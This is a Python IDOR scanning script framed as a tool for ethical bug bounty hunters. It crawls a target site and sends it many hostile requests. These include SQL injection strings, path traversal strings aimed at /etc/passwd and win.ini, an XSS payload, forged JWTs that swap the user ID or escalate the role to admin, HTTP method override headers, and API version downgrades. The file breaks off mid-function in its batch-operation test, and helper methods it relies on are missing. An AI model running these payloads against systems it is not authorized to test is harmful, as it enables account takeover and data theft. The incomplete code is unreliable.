#!/usr/bin/env python3
"""
Advanced IDOR Vulnerability Testing Script for Bug Bounty Hunting
===============================================================

This script provides comprehensive testing for IDOR vulnerabilities using multiple
advanced techniques and attack vectors. It's designed for ethical security researchers
and bug bounty hunters.

Features:
- Multi-layered parameter testing
- GraphQL and API endpoint fuzzing
- JWT/token manipulation
- Mass assignment detection
- API version manipulation
- Predictable ID detection
- HTTP method switching
- Race condition testing for IDOR
- Advanced parameter pollution
"""

import argparse
import concurrent.futures
import json
import random
import re
import string
import sys
import time
from urllib.parse import parse_qs, urlencode, urlparse

import requests
from requests.exceptions import RequestException
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

class IDORTester:
    def __init__(self, args):
        self.target_url = args.url
        self.cookies = self._parse_cookies(args.cookies)
        self.headers = self._parse_headers(args.headers)
        # Enhanced features for high-value bounties (move before user_ids)
        self.test_sequential_ids = getattr(args, 'sequential', False)
        self.test_common_ids = getattr(args, 'common_ids', False)
        self.test_privileged_endpoints = getattr(args, 'privileged', False)
        self.test_batch_operations = getattr(args, 'batch', False)
        self.test_webhook_endpoints = getattr(args, 'webhooks', False)
        self.test_file_operations = getattr(args, 'files', False)
        self.test_admin_functions = getattr(args, 'admin', False)
        self.test_payment_endpoints = getattr(args, 'payment', False)
        self.test_api_keys = getattr(args, 'api_keys', False)
        self.test_oauth_endpoints = getattr(args, 'oauth', False)
        self.test_advanced_traversal = getattr(args, 'advanced_traversal', False)
        self.user_ids = self._generate_user_ids(args.ids) if args.ids else self._generate_test_ids()
        self.verbose = args.verbose
        self.timeout = args.timeout
        self.proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None
        self.output_file = args.output
        self.verify_ssl = not args.no_ssl_verify
        self.max_workers = args.threads
        self.jwt_token = args.jwt
        self.graphql = args.graphql
        self.findings = []
        
    def _parse_cookies(self, cookie_str):
        if not cookie_str:
            return {}
        return {k.strip(): v.strip() for k, v in (item.split('=', 1) for item in cookie_str.split(';'))}
    
    def _parse_headers(self, headers_list):
        if not headers_list:
            return {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
        
        headers = {}
        for header in headers_list:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
        return headers
    
    def _generate_user_ids(self, ids_str):
        """Parse provided user IDs string into a list"""
        return [id.strip() for id in ids_str.split(',')]
    
    def _generate_test_ids(self):
        """Generate various test IDs and payloads for aggressive IDOR testing"""
        base_ids = [
            # Standard and privileged IDs
            "1", "2", "3", "admin", "user", "root", "system", "test", "demo",
            "guest", "anonymous", "public", "default", "master", "superuser",
            "administrator", "moderator", "support", "helpdesk", "staff",
            # Negative and large numbers
            "-1", "0", "00", "000", "999999999", "2147483647", "-2147483648",
            # Edge-case strings
            "null", "undefined", "none", "empty", "true", "false", "yes", "no", "on", "off",
            "super", "superadmin", "webmaster", "operator", "manager", "owner", "creator", "founder", "ceo", "cto", "cfo",
            # UUID-like IDs
            "00000000-0000-0000-0000-000000000000", "11111111-1111-1111-1111-111111111111",
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", "ffffffff-ffff-ffff-ffff-ffffffffffff",
            # Long and short IDs
            "12345678901234567890", "a", "z", "xyz", "abc",
            # SQLi payloads
            "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a", "' OR 1=1#", "' OR 1=1/*", "'--", "'/*", "' or sleep(5)--",
            # Basic path traversal
            "../", "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "..\\..\\..\\..\\windows\\win.ini",
            # Advanced path traversal techniques
            # Double encoding
            "%252e%252e%252f", "%252e%252e%255c", "%252e%252e%252f%252e%252e%252f",
            "%252e%252e%255c%252e%252e%255c", "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
            # Mixed slashes
            "..\\", "..\\..\\", "..\\..\\..\\", "..\\..\\..\\..\\",
            "..\\..\\..\\..\\..\\", "..\\..\\..\\..\\..\\..\\",
            # Dotless traversal (encoded dots and slashes)
            "%2e%2e%2f", "%2e%2e%5c", "%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c%2e%2e%5c",
            # Triple encoding
            "%25252e%25252e%25252f", "%25252e%25252e%25255c",
            # URL encoding variations
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c",
            # Mixed encoding
            "..%2f..%5c..%2f..%5c", "%2e%2e%2f..%5c%2e%2e%2f",
            # Special characters
            "<script>", "<img src=x onerror=alert(1)>", "%00", "%2e", "%2f", "%5c", "%3c", "%3e", "%27", "%22", "%3b", "%26", "%7c", "%24", "%60",
        ]
        # Add sequential IDs for high-value testing
        if self.test_sequential_ids:
            base_ids.extend([str(i) for i in range(1, 51)])  # 1-50
            base_ids.extend([str(i) for i in range(100, 151)])  # 100-150
            base_ids.extend([str(i) for i in range(1000, 1051)])  # 1000-1050
        # Add common high-value IDs
        if self.test_common_ids:
            base_ids.extend([
                "admin1", "admin2", "user1", "user2", "test1", "test2",
                "super", "superadmin", "webmaster", "operator", "manager",
                "owner", "creator", "founder", "ceo", "cto", "cfo"
            ])
        # Add random IDs
        base_ids.extend([str(random.randint(1000, 9999)) for _ in range(10)])
        base_ids.extend([f"user_{random.randint(1, 100)}" for _ in range(5)])
        base_ids.extend([f"{random.choice(string.ascii_lowercase)}{random.randint(1, 100)}" for _ in range(5)])
        return list(set(base_ids))  # Remove duplicates

    def run(self):
        """Main execution method"""
        self._print_banner()
        
        if not self._validate_target():
            console.print("[bold red]Invalid target URL. Please provide a valid URL.[/bold red]")
            return

        console.print(f"[bold blue]Target:[/bold blue] {self.target_url}")
        console.print(f"[bold blue]Starting IDOR vulnerability scan with {len(self.user_ids)} test IDs[/bold blue]")
        
        try:
            # First, crawl the target to find endpoints
            endpoints = self._discover_endpoints()
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]{task.description}[/bold blue]"),
                console=console
            ) as progress:
                task = progress.add_task("[bold blue]Testing for IDOR vulnerabilities...", total=None)
                
                # Run all tests
                self._test_standard_idor(endpoints)
                self._test_parameter_pollution(endpoints)
                self._test_http_method_switching(endpoints)
                self._test_api_versioning(endpoints)
                self._test_jwt_manipulation()
                self._test_race_conditions(endpoints)
                if self.graphql:
                    self._test_graphql_idor()
                self._test_mass_assignment()
                
                # Enhanced high-value tests
                if self.test_privileged_endpoints:
                    self._test_privileged_endpoints(endpoints)
                if self.test_batch_operations:
                    self._test_batch_operations(endpoints)
                if self.test_webhook_endpoints:
                    self._test_webhook_endpoints(endpoints)
                if self.test_file_operations:
                    self._test_file_operations(endpoints)
                if self.test_admin_functions:
                    self._test_admin_functions(endpoints)
                if self.test_payment_endpoints:
                    self._test_payment_endpoints(endpoints)
                if self.test_api_keys:
                    self._test_api_key_endpoints(endpoints)
                if self.test_oauth_endpoints:
                    self._test_oauth_endpoints(endpoints)
                
                # Advanced techniques
                self._test_advanced_techniques(endpoints)
                
                # Authentication bypass testing
                self._test_auth_bypass(endpoints)
                
                # Advanced path traversal testing
                if self.test_advanced_traversal:
                    self._test_advanced_path_traversal(endpoints)
                
                progress.update(task, completed=True, description="[bold green]Testing completed![/bold green]")
        
        except KeyboardInterrupt:
            console.print("\n[bold yellow]Testing interrupted by user[/bold yellow]")
        except Exception as e:
            console.print(f"\n[bold red]An error occurred: {str(e)}[/bold red]")
        
        self._print_results()
        
        if self.output_file:
            self._save_results()

    def _discover_endpoints(self):
        """Crawl the target to discover endpoints for testing"""
        console.print("[bold blue]Discovering endpoints...[/bold blue]")
        
        discovered = set()
        base_domain = urlparse(self.target_url).netloc
        
        try:
            # Start with the provided URL
            discovered.add(self.target_url)
            
            # Make an initial request to find links
            response = requests.get(
                self.target_url,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxy,
                verify=self.verify_ssl,
                timeout=self.timeout
            )
            
            # Extract links from the response
            links = re.findall(r'href=[\'"]?([^\'" >]+)', response.text)
            
            # Check for potential API endpoints in JavaScript files
            js_patterns = [
                r'url:\s*[\'"]([^\'"\s]+)[\'"]',
                r'endpoint[\'"]?\s*:\s*[\'"]([^\'"\s]+)[\'"]',
                r'api[\'"]?\s*:\s*[\'"]([^\'"\s]+)[\'"]',
                r'fetch\([\'"]([^\'"\s]+)[\'"]'
            ]
            
            for pattern in js_patterns:
                api_endpoints = re.findall(pattern, response.text)
                links.extend(api_endpoints)
            
            # Process and normalize the discovered links
            for link in links:
                if link.startswith('/'):
                    link = f"{urlparse(self.target_url).scheme}://{base_domain}{link}"
                elif not link.startswith(('http://', 'https://')):
                    link = f"{self.target_url.rstrip('/')}/{link.lstrip('/')}"
                
                # Only include links from the same domain
                if urlparse(link).netloc == base_domain:
                    discovered.add(link)
            
            if self.verbose:
                console.print(f"[green]Discovered {len(discovered)} endpoints[/green]")
            
            # Look for API endpoints based on common patterns
            api_patterns = [
                '/api/v1/', '/api/v2/', '/api/', '/v1/', '/v2/',
                '/user/', '/users/', '/account/', '/accounts/',
                '/profile/', '/profiles/', '/order/', '/orders/',
                '/item/', '/items/', '/document/', '/documents/',
                '/file/', '/files/', '/data/', '/resource/', '/resources/',
                # Authentication-related endpoints
                '/login/', '/logout/', '/auth/', '/authentication/',
                '/session/', '/sessions/', '/token/', '/tokens/',
                '/oauth/', '/oauth2/', '/sso/', '/saml/',
                '/register/', '/signup/', '/signin/', '/signout/',
                '/password/', '/reset/', '/forgot/', '/recover/',
                '/verify/', '/confirm/', '/activate/', '/validate/',
                '/admin/', '/administrator/', '/manage/', '/management/',
                '/dashboard/', '/panel/', '/console/', '/control/',
                '/settings/', '/config/', '/configuration/',
                '/system/', '/sys/', '/internal/', '/private/',
                '/billing/', '/invoice/', '/payment/', '/subscription/',
                '/support/', '/helpdesk/', '/ticket/', '/case/',
                '/audit/', '/log/', '/logs/', '/activity/',
                '/report/', '/reports/', '/analytics/', '/stats/',
                '/backup/', '/restore/', '/export/', '/import/',
                '/notification/', '/webhook/', '/callback/',
                '/api-key/', '/apikey/', '/secret/', '/secrets/'
            ]
            
            likely_endpoints = set()
            for endpoint in discovered:
                for pattern in api_patterns:
                    if pattern in endpoint:
                        likely_endpoints.add(endpoint)
                        break
            
            # If we found likely API endpoints, prioritize those
            if likely_endpoints:
                if self.verbose:
                    console.print(f"[green]Found {len(likely_endpoints)} potential API endpoints[/green]")
                return list(likely_endpoints)
            
            return list(discovered)
            
        except Exception as e:
            console.print(f"[yellow]Error discovering endpoints: {str(e)}[/yellow]")
            return [self.target_url]

    def _test_standard_idor(self, endpoints):
        """Test for standard IDOR vulnerabilities"""
        if self.verbose:
            console.print("[bold blue]Testing for standard IDOR vulnerabilities...[/bold blue]")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                url_parts = urlparse(endpoint)
                path_parts = url_parts.path.split('/')
                query_params = parse_qs(url_parts.query)
                
                # Look for ID-like parameters in the URL path
                for i, part in enumerate(path_parts):
                    if self._looks_like_id(part):
                        for test_id in self.user_ids:
                            # Create a modified URL with the test ID
                            new_path_parts = path_parts.copy()
                            new_path_parts[i] = test_id
                            new_path = '/'.join(new_path_parts)
                            
                            new_url = url_parts._replace(path=new_path).geturl()
                            
                            futures.append(executor.submit(
                                self._test_url_for_idor,
                                original_url=endpoint,
                                modified_url=new_url,
                                description=f"Path parameter IDOR test: replaced '{part}' with '{test_id}'"
                            ))
                
                # Look for ID-like parameters in query parameters
                for param, values in query_params.items():
                    if self._looks_like_id_param(param):
                        for test_id in self.user_ids:
                            # Create a modified query parameter with the test ID
                            new_params = query_params.copy()
                            new_params[param] = [test_id]
                            
                            new_query = urlencode(new_params, doseq=True)
                            new_url = url_parts._replace(query=new_query).geturl()
                            
                            futures.append(executor.submit(
                                self._test_url_for_idor,
                                original_url=endpoint,
                                modified_url=new_url,
                                description=f"Query parameter IDOR test: changed '{param}={values[0]}' to '{param}={test_id}'"
                            ))
            
            # Process all the results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in standard IDOR test: {str(e)}[/yellow]")

    def _test_parameter_pollution(self, endpoints):
        """Aggressively test for IDOR via parameter pollution and fuzzing all parameters"""
        if self.verbose:
            console.print("[bold blue]Aggressively testing for parameter pollution and fuzzing all parameters...[/bold blue]")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                url_parts = urlparse(endpoint)
                query_params = parse_qs(url_parts.query)
                
                # Nothing to test if there are no query parameters
                if not query_params:
                    continue
                
                for param, values in query_params.items():
                    for test_id in self.user_ids:
                        # Test 1: Add duplicate parameter with different value
                        new_params = query_params.copy()
                        new_params[param].append(test_id)
                        new_query = urlencode(new_params, doseq=True)
                        new_url = url_parts._replace(query=new_query).geturl()
                        futures.append(executor.submit(
                            self._test_url_for_idor,
                            original_url=endpoint,
                            modified_url=new_url,
                            description=f"Parameter pollution test: added duplicate '{param}={test_id}'"
                        ))
                        # Test 2: Add parameter with different case
                        new_params = query_params.copy()
                        upper_param = param.upper() if param.islower() else param.lower()
                        new_params[upper_param] = [test_id]
                        new_query = urlencode(new_params, doseq=True)
                        new_url = url_parts._replace(query=new_query).geturl()
                        futures.append(executor.submit(
                            self._test_url_for_idor,
                            original_url=endpoint,
                            modified_url=new_url,
                            description=f"Case manipulation test: added '{upper_param}={test_id}'"
                        ))
                        # Test 3: URL-encoded parameter name
                        new_params = query_params.copy()
                        encoded_param = param.replace('_', '%5f').replace('-', '%2d')
                        new_params[encoded_param] = [test_id]
                        new_query = urlencode(new_params, doseq=True)
                        new_url = url_parts._replace(query=new_query).geturl()
                        futures.append(executor.submit(
                            self._test_url_for_idor,
                            original_url=endpoint,
                            modified_url=new_url,
                            description=f"Encoded parameter test: added '{encoded_param}={test_id}'"
                        ))
                        # Test 4: JSON embedded in parameter
                        new_params = query_params.copy()
                        json_payload = json.dumps({param: test_id})
                        new_params[param] = [json_payload]
                        new_query = urlencode(new_params, doseq=True)
                        new_url = url_parts._replace(query=new_query).geturl()
                        futures.append(executor.submit(
                            self._test_url_for_idor,
                            original_url=endpoint,
                            modified_url=new_url,
                            description=f"JSON parameter test: changed '{param}' to contain JSON payload"
                        ))
                        # Test 5: Remove the parameter
                        new_params = query_params.copy()
                        del new_params[param]
                        new_query = urlencode(new_params, doseq=True)
                        new_url = url_parts._replace(query=new_query).geturl()
                        futures.append(executor.submit(
                            self._test_url_for_idor,
                            original_url=endpoint,
                            modified_url=new_url,
                            description=f"Parameter removal test: removed '{param}'"
                        ))
                        # Test 6: Fuzz with special characters and encodings
                        for special in ["%00", "%2e", "%2f", "%5c", "%3c", "%3e", "%27", "%22", "%3b", "%26", "%7c", "%24", "%60"]:
                            new_params = query_params.copy()
                            new_params[param] = [test_id + special]
                            new_query = urlencode(new_params, doseq=True)
                            new_url = url_parts._replace(query=new_query).geturl()
                            futures.append(executor.submit(
                                self._test_url_for_idor,
                                original_url=endpoint,
                                modified_url=new_url,
                                description=f"Special char fuzz: '{param}={test_id + special}'"
                            ))
            # Process all the results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in parameter pollution test: {str(e)}[/yellow]")

    def _test_http_method_switching(self, endpoints):
        """Test for IDOR via HTTP method switching"""
        if self.verbose:
            console.print("[bold blue]Testing for HTTP method switching vulnerabilities...[/bold blue]")
        
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
        headers_with_method = {
            "X-HTTP-Method-Override": "GET",
            "X-HTTP-Method": "GET",
            "X-Method-Override": "GET"
        }
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                # Skip non-API endpoints for method switching tests
                if not any(pattern in endpoint for pattern in ['/api/', '/v1/', '/v2/', '/user', '/account']):
                    continue
                    
                url_parts = urlparse(endpoint)
                path_parts = url_parts.path.split('/')
                
                # Look for ID-like parameters in the URL path
                for i, part in enumerate(path_parts):
                    if self._looks_like_id(part):
                        for test_id in self.user_ids[:2]:  # Limit test IDs to reduce request count
                            # Create a modified URL with the test ID
                            new_path_parts = path_parts.copy()
                            new_path_parts[i] = test_id
                            new_path = '/'.join(new_path_parts)
                            
                            new_url = url_parts._replace(path=new_path).geturl()
                            
                            # Test different HTTP methods
                            for method in methods:
                                if method != "GET":  # GET is already tested in standard IDOR
                                    futures.append(executor.submit(
                                        self._test_method_for_idor,
                                        url=new_url,
                                        method=method,
                                        description=f"Method switching test: using {method} on '{new_url}'"
                                    ))
                            
                            # Test HTTP method override headers
                            for header_name, header_value in headers_with_method.items():
                                for method in ["PUT", "DELETE"]:
                                    header_value = method
                                    new_headers = self.headers.copy()
                                    new_headers[header_name] = header_value
                                    
                                    futures.append(executor.submit(
                                        self._test_headers_for_idor,
                                        url=new_url,
                                        headers=new_headers,
                                        description=f"Method override header test: {header_name}={header_value}"
                                    ))
            
            # Process all the results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in HTTP method switching test: {str(e)}[/yellow]")

    def _test_api_versioning(self, endpoints):
        """Test for IDOR via API version manipulation"""
        if self.verbose:
            console.print("[bold blue]Testing for API version manipulation vulnerabilities...[/bold blue]")
        
        version_patterns = [
            ('/v1/', '/v0/'),
            ('/v2/', '/v1/'),
            ('/v3/', '/v2/'),
            ('/api/v1/', '/api/v0/'),
            ('/api/v2/', '/api/v1/'),
            ('/api/v3/', '/api/v2/')
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                for current_ver, older_ver in version_patterns:
                    if current_ver in endpoint:
                        # Try switching to an older API version that might have less strict access controls
                        new_url = endpoint.replace(current_ver, older_ver)
                        
                        futures.append(executor.submit(
                            self._test_url_for_idor,
                            original_url=endpoint,
                            modified_url=new_url,
                            description=f"API version downgrade test: switched from {current_ver} to {older_ver}"
                        ))
            
            # Process all the results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in API version test: {str(e)}[/yellow]")

    def _test_jwt_manipulation(self):
        """Test for IDOR via JWT token manipulation"""
        if not self.jwt_token:
            return
            
        if self.verbose:
            console.print("[bold blue]Testing for JWT token manipulation vulnerabilities...[/bold blue]")
        
        try:
            # Basic JWT parsing
            jwt_parts = self.jwt_token.split('.')
            if len(jwt_parts) != 3:
                if self.verbose:
                    console.print("[yellow]Invalid JWT format[/yellow]")
                return
                
            # Decode the payload
            import base64
            try:
                # Fix padding for base64 decoding
                payload = jwt_parts[1]
                payload += '=' * (4 - len(payload) % 4) if len(payload) % 4 != 0 else ''
                decoded_payload = base64.b64decode(payload).decode('utf-8')
                payload_json = json.loads(decoded_payload)
                
                if self.verbose:
                    console.print(f"[green]Decoded JWT payload: {json.dumps(payload_json, indent=2)}[/green]")
                
                # Look for user ID or similar fields
                id_fields = ['sub', 'user_id', 'id', 'userId', 'uid']
                role_fields = ['role', 'roles', 'permissions', 'scope', 'authorities']
                
                for field in id_fields:
                    if field in payload_json:
                        original_value = payload_json[field]
                        
                        for test_id in self.user_ids[:3]:  # Limit test IDs to reduce request count
                            # Create modified JWT with different user ID
                            modified_payload = payload_json.copy()
                            modified_payload[field] = test_id
                            
                            # Note: This creates an invalid signature, but that's part of the test
                            modified_payload_bytes = json.dumps(modified_payload).encode('utf-8')
                            modified_payload_b64 = base64.b64encode(modified_payload_bytes).decode('utf-8').rstrip('=')
                            
                            modified_jwt = f"{jwt_parts[0]}.{modified_payload_b64}.{jwt_parts[2]}"
                            
                            # Test the modified JWT
                            new_headers = self.headers.copy()
                            auth_header = next((k for k in new_headers.keys() if k.lower() == 'authorization'), None)
                            
                            if auth_header:
                                # If we have an Authorization header, update it
                                if 'Bearer' in new_headers[auth_header]:
                                    new_headers[auth_header] = f"Bearer {modified_jwt}"
                                else:
                                    new_headers[auth_header] = modified_jwt
                            else:
                                # Otherwise, add a new one
                                new_headers['Authorization'] = f"Bearer {modified_jwt}"
                            
                            # Test with the target URL
                            self._test_headers_for_idor(
                                url=self.target_url,
                                headers=new_headers,
                                description=f"JWT manipulation test: changed '{field}' from '{original_value}' to '{test_id}'"
                            )
                
                # Also test role/permission escalation
                for field in role_fields:
                    if field in payload_json:
                        original_value = payload_json[field]
                        
                        # Common elevated role values to test
                        test_roles = ['admin', 'administrator', 'superuser', 'root', 'system', 
                                     ['admin'], ['administrator'], ['superuser'],
                                     {'role': 'admin'}, {'role': 'administrator'}]
                        
                        for test_role in test_roles:
                            # Create modified JWT with elevated role
                            modified_payload = payload_json.copy()
                            modified_payload[field] = test_role
                            
                            modified_payload_bytes = json.dumps(modified_payload).encode('utf-8')
                            modified_payload_b64 = base64.b64encode(modified_payload_bytes).decode('utf-8').rstrip('=')
                            
                            modified_jwt = f"{jwt_parts[0]}.{modified_payload_b64}.{jwt_parts[2]}"
                            
                            # Test the modified JWT
                            new_headers = self.headers.copy()
                            auth_header = next((k for k in new_headers.keys() if k.lower() == 'authorization'), None)
                            
                            if auth_header:
                                if 'Bearer' in new_headers[auth_header]:
                                    new_headers[auth_header] = f"Bearer {modified_jwt}"
                                else:
                                    new_headers[auth_header] = modified_jwt
                            else:
                                new_headers['Authorization'] = f"Bearer {modified_jwt}"
                            
                            self._test_headers_for_idor(
                                url=self.target_url,
                                headers=new_headers,
                                description=f"JWT role escalation test: changed '{field}' from '{original_value}' to '{test_role}'"
                            )
                    
            except Exception as e:
                if self.verbose:
                    console.print(f"[yellow]Error decoding JWT: {str(e)}[/yellow]")
                
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error in JWT manipulation test: {str(e)}[/yellow]")

    def _test_race_conditions(self, endpoints):
        """Test for IDOR via race conditions"""
        if self.verbose:
            console.print("[bold blue]Testing for race condition vulnerabilities...[/bold blue]")
        
        # Select a few endpoints for race condition testing (to avoid excessive requests)
        test_endpoints = []
        for endpoint in endpoints:
            if any(pattern in endpoint for pattern in ['/api/', '/user', '/account', '/profile', '/order']):
                test_endpoints.append(endpoint)
        
        # If we found too many, limit to 3 endpoints
        if len(test_endpoints) > 3:
            test_endpoints = random.sample(test_endpoints, 3)
        elif not test_endpoints:
            # If no specific endpoints found, just use the target URL
            test_endpoints = [self.target_url]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            for endpoint in test_endpoints:
                url_parts = urlparse(endpoint)
                path_parts = url_parts.path.split('/')
                
                # Look for ID-like parameters in the URL path
                for i, part in enumerate(path_parts):
                    if self._looks_like_id(part):
                        # Use only a couple of test IDs to reduce load
                        test_id = random.choice(self.user_ids)
                        
                        # Create a modified URL with the test ID
                        new_path_parts = path_parts.copy()
                        new_path_parts[i] = test_id
                        new_path = '/'.join(new_path_parts)
                        
                        new_url = url_parts._replace(path=new_path).geturl()
                        
                        # Submit multiple concurrent requests
                        futures = [
                            executor.submit(self._make_request, new_url)
                            for _ in range(5)  # 5 concurrent requests
                        ]
                        
                        try:
                            responses = [future.result() for future in concurrent.futures.as_completed(futures)]
                            
                            # Check if any of the responses differ significantly
                            status_codes = [r.status_code for r in responses if r]
                            response_lengths = [len(r.text) for r in responses if r]
                            
                            if len(set(status_codes)) > 1 or max(response_lengths) - min(response_lengths) > 100:
                                self.findings.append({
                                    "type": "Race Condition",
                                    "url": new_url,
                                    "description": "Race condition detected - inconsistent responses received",
                                    "status_codes": status_codes,
                                    "response_lengths": response_lengths
                                })
                                
                        except Exception as e:
                            if self.verbose:
                                console.print(f"[yellow]Error in race condition test: {str(e)}[/yellow]")

    def _test_graphql_idor(self):
        """Test for IDOR in GraphQL endpoints"""
        if self.verbose:
            console.print("[bold blue]Testing for GraphQL IDOR vulnerabilities...[/bold blue]")
        
        graphql_endpoints = [f"{self.target_url.rstrip('/')}/graphql", f"{self.target_url.rstrip('/')}/api/graphql"]
        
        # Standard GraphQL queries to test
        test_queries = [
            # User query
            """
            query {
              user(id: "%s") {
                id
                username
                email
                profile {
                  name
                  avatar
                }
              }
            }
            """,
            # Users query
            """
            query {
              users {
                id
                username
                email
              }
            }
            """,
            # Get user by username
            """
            query {
              userByUsername(username: "admin") {
                id
                email
                role
              }
            }
            """,
            # Nested resource query
            """
            query {
              user(id: "%s") {
                orders {
                  id
                  total
                  items {
                    id
                    name
                    price
                  }
                }
              }
            }
            """
        ]
        
        for endpoint in graphql_endpoints:
            for query_template in test_queries:
                if "%s" in query_template:
                    for test_id in self.user_ids[:3]:  # Limit test IDs
                        query = query_template % test_id
                        
                        try:
                            # Test POST request with JSON
                            response = requests.post(
                                endpoint,
                                json={"query": query},
                                headers=self.headers,
                                cookies=self.cookies,
                                proxies=self.proxy,
                                verify=self.verify_ssl,
                                timeout=self.timeout
                            )
                            
                            self._check_graphql_response(response, endpoint, query)
                            
                        except Exception as e:
                            if self.verbose:
                                console.print(f"[yellow]Error in GraphQL test: {str(e)}[/yellow]")
                else:
                    # For queries without parameters
                    try:
                        response = requests.post(
                            endpoint,
                            json={"query": query_template},
                            headers=self.headers,
                            cookies=self.cookies,
                            proxies=self.proxy,
                            verify=self.verify_ssl,
                            timeout=self.timeout
                        )
                        
                        self._check_graphql_response(response, endpoint, query_template)
                        
                    except Exception as e:
                        if self.verbose:
                            console.print(f"[yellow]Error in GraphQL test: {str(e)}[/yellow]")

    def _test_privileged_endpoints(self, endpoints):
        """Test for IDOR in privileged endpoints that often contain high-value data"""
        if self.verbose:
            console.print("[bold blue]Testing for privileged endpoint vulnerabilities...[/bold blue]")
        
        privileged_patterns = [
            '/admin/', '/administrator/', '/manage/', '/management/',
            '/dashboard/', '/panel/', '/console/', '/control/',
            '/settings/', '/config/', '/configuration/',
            '/system/', '/sys/', '/internal/', '/private/',
            '/api/admin/', '/api/management/', '/api/system/',
            '/v1/admin/', '/v2/admin/', '/api/v1/admin/',
            '/user/admin/', '/users/admin/', '/account/admin/',
            '/billing/', '/invoice/', '/payment/', '/subscription/',
            '/support/', '/helpdesk/', '/ticket/', '/case/',
            '/audit/', '/log/', '/logs/', '/activity/',
            '/report/', '/reports/', '/analytics/', '/stats/',
            '/backup/', '/restore/', '/export/', '/import/',
            '/notification/', '/webhook/', '/callback/',
            '/oauth/', '/auth/', '/sso/', '/saml/',
            '/api-key/', '/apikey/', '/token/', '/secret/'
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                for pattern in privileged_patterns:
                    if pattern in endpoint.lower():
                        # Test with different user IDs
                        for test_id in self.user_ids[:5]:  # Limit to reduce noise
                            # Test path parameter replacement
                            if test_id in endpoint:
                                continue  # Skip if already contains the test ID
                                
                            # Try to inject the test ID into the path
                            path_parts = endpoint.split('/')
                            for i, part in enumerate(path_parts):
                                if self._looks_like_id(part):
                                    new_parts = path_parts.copy()
                                    new_parts[i] = test_id
                                    new_endpoint = '/'.join(new_parts)
                                    
                                    futures.append(executor.submit(
                                        self._test_url_for_idor,
                                        original_url=endpoint,
                                        modified_url=new_endpoint,
                                        description=f"Privileged endpoint test: {pattern} with ID {test_id}"
                                    ))
                                    break
                            else:
                                # If no ID found in path, try adding one
                                new_endpoint = f"{endpoint.rstrip('/')}/{test_id}"
                                futures.append(executor.submit(
                                    self._test_url_for_idor,
                                    original_url=endpoint,
                                    modified_url=new_endpoint,
                                    description=f"Privileged endpoint test: added ID {test_id} to {pattern}"
                                ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "HIGH"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in privileged endpoint test: {str(e)}[/yellow]")

    def _test_batch_operations(self, endpoints):
        """Test for IDOR in batch operations that often process multiple resources"""
        if self.verbose:
            console.print("[bold blue]Testing for batch operation vulnerabilities...[/bold blue]")
        
        batch_patterns = [
            '/batch/', '/bulk/', '/mass/', '/multiple/',
            '/batch-update/', '/bulk-update/', '/mass-update/',
            '/batch-delete/', '/bulk-delete/', '/mass-delete/',
            '/batch-create/', '/bulk-create/', '/mass-create/',
            '/api/batch/', '/api/bulk/', '/api/mass/',
            '/v1/batch/', '/v2/batch/', '/api/v1/batch/'
        ]
        
        batch_payloads = [
            {"ids": ["1", "2", "3", "admin", "user"]},
            {"user_ids": ["1", "2", "3", "admin", "user"]},
            {"account_ids": ["1", "2", "3", "admin", "user"]},
            {"items": [{"id": "1"}, {"id": "2"}, {"id": "admin"}, {"id": "user"}]},
            {"users": [{"id": "1"}, {"id": "2"}, {"id": "admin"}, {"id": "user"}]},
            {"accounts": [{"id": "1"}, {"id": "2"}, {"id": "admin"}, {"id": "user"}]}
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                for pattern in batch_patterns:
                    if pattern in endpoint.lower():
                        for payload in batch_payloads:
                            # Test POST with batch payload
